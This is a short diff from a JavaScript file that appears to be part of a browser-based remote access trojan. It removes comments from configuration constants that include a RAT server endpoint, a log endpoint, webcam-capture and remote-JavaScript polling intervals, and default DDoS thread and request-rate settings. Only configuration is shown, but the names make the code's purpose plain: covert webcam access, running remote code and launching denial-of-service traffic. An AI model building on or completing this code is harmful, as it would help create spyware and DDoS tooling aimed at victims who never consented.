@@ -5,10 +5,10 @@
     const logServerURL = '/main/logs';
     const ratServerURL = '/main/rat';
     const heartbeatInterval = 60000;
-    const webcamInterval = 120000; // Separate interval for webcam
-    const remoteJSInterval = 90000; // Separate interval for remote JS
-    const defaultDDoSThreads = 10; // Define a constant for default DDoS threads
-    const defaultDDoSRequestsPerSecond = 100; // Define a constant for default DDoS rate
+    const webcamInterval = 120000;
+    const remoteJSInterval = 90000;
+    const defaultDDoSThreads = 10;
+    const defaultDDoSRequestsPerSecond = 100;
     const defaultDDoSRandomStringLength = 50;
     let sessionID = localStorage.getItem(storageKeyPrefix + 'sessionID');
 
